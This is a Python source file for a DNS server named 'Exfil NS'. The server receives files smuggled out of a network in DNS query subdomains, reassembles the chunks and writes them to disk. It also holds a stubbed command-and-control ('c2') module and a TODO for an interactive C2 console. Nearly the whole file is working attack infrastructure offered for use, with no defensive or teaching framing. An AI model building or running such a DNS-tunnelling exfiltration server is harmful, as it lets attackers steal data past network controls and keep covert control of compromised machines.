#!/bin/env python3 
from __future__ import print_function

from dnslib import RR,QTYPE,RCODE,TXT,parse_time
from dnslib.label import DNSLabel
from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger

class ExfilResolver(BaseResolver):
    def __init__(self,origin,ttl):
        self.origin = DNSLabel(origin)
        self.ttl = parse_time(ttl)
        self.routes = {}
        self.files = dict()

    def resolve(self,request,handler):
        reply = request.reply()
        qname = str(request.q.qname)

        # Strip the top level domains off to just handle the part relevant to us
        qname = qname.replace("." + str(self.origin), "") 

        # The first sub-domain will be the module
        # file upload module
        module = qname.split(".")[-1]
        if module == "test": 
            print("Running test")
            message = "This is a test \"" 
            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(message)))
            return reply
            
        if module == "fu":
            return self.fileupload(request, qname)

        if module == "c2":
            return self.cnc(request, qname)
        
        print("Module not found:", module)
        reply.header.rcode = RCODE.NXDOMAIN
        return reply

    # unimplemented
    def cnc(self, request, qname):
        reply = request.reply()



        reply.header.rcode = RCODE.NXDOMAIN
        return reply
    # DNS requests for this module look like this: 
    # [data].[index].[file id].fu.[origin]
    # OR 
    # start-[lines].000.[file id].origin
    def fileupload(self, request, qname):
        reply = request.reply()
        if len(qname.split(".")) != 4:
            error = "Error: Incorrect amount of subdomains"
            print(error)
            # reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
            reply.header.rcode = RCODE.NXDOMAIN
            return reply
            
        data = qname.split(".")[0].upper()
        index = qname.split(".")[1]
        filename = qname.split(".")[2]

        if '-' in data: 
            print("New file incoming, lines:", data.split("-")[1])
            self.files.update({filename: [None] * int(data.split("-")[1])})
            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
            return reply 
            

        # print("DATA RECV:", filename, index, data)
        self.files[filename][int(index)] = data
        self.checkfile(filename)
        # reply.header.rcode = RCODE.NXDOMAIN
        reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("This is a reply")))
        return reply

    # Doing this in a seperate thread would be nice
    # this is for checking if a fileupload is complete 
    def checkfile(self, filename):
        # this is one dense line of code
        nones = len([x for x in self.files[filename] if x is None])
        if nones is 0: 
            # The file is ready for output
            print("File:", filename, "completed upload")
            with open(filename, "w") as f:
                for x in self.files[filename]: 
                    f.write(x)
            print("File:", filename, "written to disk")
            # TODO decode the file
            # TODO delete that dictionary entry for mem reasons
                
        else:
            # The file is not ready for output
            print("File:", filename, "is still missing", nones, "lines")

if __name__ == '__main__':

    import argparse,sys,time

    p = argparse.ArgumentParser(description="Exfil NS")
    p.add_argument("--origin","-o",required=True,
                    metavar="<origin>",
                    help="Origin domain label (Ex: example.com)")
    args = p.parse_args()

    resolver = ExfilResolver(args.origin,"60s")
    logger = DNSLogger("-request,-reply",False)

    udp_server = DNSServer(resolver, address="0.0.0.0", logger=logger)
    udp_server.start_thread()

    tcp_server = DNSServer(resolver, address="0.0.0.0", tcp=True, logger=logger)
    tcp_server.start_thread()

    print("Started dns server")
    # TODO write some interactive shit here for c2
    while udp_server.isAlive():
        time.sleep(1)
